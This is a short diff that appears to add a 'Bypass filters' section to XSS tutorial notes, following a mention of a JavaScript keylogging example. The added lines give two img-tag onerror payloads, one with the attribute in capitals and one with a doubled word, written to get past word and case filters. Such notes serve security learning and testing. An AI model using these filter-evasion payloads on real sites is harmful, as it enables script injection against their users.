@@ -58,3 +58,12 @@ Javascript can even be used for keylogging with the example script
 </script> 
 ```
 
+```
+Bypass filters
+```
+
+To bypass word filter can use payload like
+
+`<img src="blah" onerror=alert("HHelloello") />`
+
+`<img src="blah" ONERROR=alert("HHelloello") />`
